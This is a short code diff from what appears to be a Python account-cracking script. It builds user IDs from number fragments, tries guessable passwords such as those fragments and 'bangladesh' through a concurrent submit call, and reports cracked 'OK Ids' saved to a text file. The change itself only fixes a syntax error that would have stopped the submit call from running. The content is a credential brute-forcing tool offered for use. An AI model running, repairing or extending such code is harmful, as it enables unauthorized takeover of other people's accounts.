@@ -162,7 +162,7 @@ def fuck():
         for love in user:
             uid = code+name+cod+love
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
-            asha.submit(,uid,pwx,tl)
+            asha.submit(uid,pwx,tl)
     print('-------------------')
     print(' [✓] Crack process has been completed')
     print(' [✓] OK Ids saved as AHAD ISLAM-OK.txt')
